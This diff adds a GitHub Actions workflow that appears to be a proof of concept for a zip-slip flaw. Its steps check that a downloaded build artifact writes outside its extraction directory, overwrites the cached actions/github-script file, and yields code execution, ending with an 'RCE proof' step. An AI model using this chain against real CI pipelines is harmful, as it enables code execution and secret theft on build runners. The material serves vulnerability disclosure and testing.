@@ -1,0 +1,39 @@
+name: Deploy
+
+permissions:
+  actions: read
+  contents: read
+
+on:
+  workflow_run:
+    workflows: ["Build"]
+    types: [completed]
+
+jobs:
+  deploy:
+    if: github.event.workflow_run.conclusion == 'success'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Action cache BEFORE extraction
+        run: |
+          echo "workspace=$GITHUB_WORKSPACE"
+          ls -la /home/runner/work/_actions/actions/github-script/v8/dist/index.js || echo ABSENT
+      - name: Download build artifact
+        uses: actions/download-artifact@v5
+        with:
+          name: docs-build-${{ github.event.workflow_run.id }}
+          path: docs-build
+          run-id: ${{ github.event.workflow_run.id }}
+          github-token: ${{ github.token }}
+      - name: Prove write escaped the extraction directory
+        run: |
+          cat /home/runner/work/zipslip-site-index.html && echo ESCAPE_CONFIRMED
+      - name: Action cache AFTER extraction
+        run: |
+          head -c 120 /home/runner/work/_actions/actions/github-script/v8/dist/index.js; echo
+      - name: Later step that runs the overwritten action file
+        uses: actions/github-script@v8
+        with:
+          script: console.log('benign original script')
+      - name: RCE proof
+        run: cat /home/runner/work/rce-proof.txt
